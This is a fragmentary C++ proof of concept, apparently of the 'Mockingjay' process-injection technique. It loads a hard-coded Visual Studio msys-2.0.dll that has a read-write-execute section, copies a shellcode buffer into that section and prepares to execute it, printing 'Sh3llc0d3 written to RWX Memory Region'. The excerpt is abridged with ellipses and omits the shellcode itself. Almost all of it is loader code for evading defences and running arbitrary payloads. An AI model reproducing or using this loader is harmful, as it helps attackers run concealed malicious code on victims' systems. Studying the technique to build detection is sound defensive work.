...
BOOL WriteCodeToSection(LPVOID rwxSectionAddr, const unsigned char* shellcode, SIZE_T sizeShellcode, DWORD_PTR rwxSectionSize) {
    if (IsShellcodeFitting(rwxSectionSize, sizeShellcode)) {
        ...
        std::cout << std::dec << sizeShellcode << " bytes of Sh3llc0d3 written to RWX Memory Region\n";
        return true;
    }
    else {
...
int main()
{
    std::cout << "MOCKINGJAY SUPER ASCII ART\n\n\n";

    // Load hardcoded vulnerable DLL
    HMODULE TargetDLL = ::LoadLibraryW(L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll");
    ...
    if (WriteCodeToSection(rwxSectionAddr, Shellcode, sizeof(Shellcode), FindRWXSize(TargetDLL))) {
        // Shellcode was written successfully, proceed with execution of the shellcode
